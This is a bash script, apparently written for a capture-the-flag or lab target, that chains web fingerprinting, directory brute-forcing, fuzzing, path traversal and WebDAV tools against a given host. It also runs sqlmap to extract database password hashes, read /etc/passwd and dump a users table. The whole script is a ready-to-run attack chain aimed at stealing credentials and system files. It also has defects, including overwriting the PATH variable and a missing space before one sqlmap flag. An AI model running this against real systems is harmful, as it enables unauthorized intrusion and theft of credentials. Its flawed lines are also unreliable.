#!/bin/bash          

IP=$1
LOGFILE=$1_http_scan.log   
PORT=${2:-80}
PATH=$3
export PATH=$PATH:/usr/bin

if [ -z "$IP" -o -z "$PORT" ]
then
  echo "Usage: $0 host [port]"
  echo "port defaults to 80."
  exit 1
fi

http_path=/usr/bin/httprint
dmitry_path=/usr/bin/dmitry
whatweb_path=/usr/bin/whatweb
amap_path=/usr/bin/amap
uniscan_path=/usr/bin/uniscan
fimap_path=/usr/bin/fimap
dirb_path=/usr/bin/dirb
wfuzz_path=/usr/bin/wfuzz
sqlmap_path=/usr/bin/sqlmap
dotdotpwn_path=/usr/sbin/dotdotpwn.pl
nikto_path=/usr/bin/nikto

if [[ "$IP" != "yes" ]]
then
wget http://www.net-square.com/signature.txt
$http_path -h $IP:$PORT -s signature.txt > $LOGFILE
$dmitry_path -p -b $IP:$PORT >> $LOGFILE
$whatweb_path -v $IP:$PORT >> $LOGFILE
#nmap -sSV -P0 $IP >> $LOGFILE
$amap_path -bvq $IP $PORT >> $LOGFILE
#$uniscan_path -u http://$IP:$PORT/ -qd >> $LOGFILE
$fimap_path -u "http://$IP:$PORT/" >> $LOGFILE
$dirb_path http://$IP:$PORT/ >> $LOGFILE
$wfuzz_path -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 $IP:$PORT >> $LOGFILE
$sqlmap_path -u http://$IP:$PORT/$PATH
$sqlmap_path -u "http://$IP:$PORT/$PATH" --passwords  >> $LOGFILE
$sqlmap_path -u "http://$IP:$PORT/$PATH" --file-read=/etc/passwd  >> $LOGFILE
$sqlmap_path -u "http://$IP:$PORT/$PATH"--dbs  >> $LOGFILE
$sqlmap_path -u http://$IP:$PORT/$PATH --current-db
$sqlmap_path -u http://$IP:$PORT/$PATH -D seth --tables
$sqlmap_path -u http://$IP:$PORT/$PATH -D seth -T users --dump
$dotdotpwn_path -m http -h $IP:$PORT >> $LOGFILE
$nikto_path -e 1 -host http://$IP:$PORT >> $LOGFILE
cadaver http://$IP:$PORT/$PATH
fi
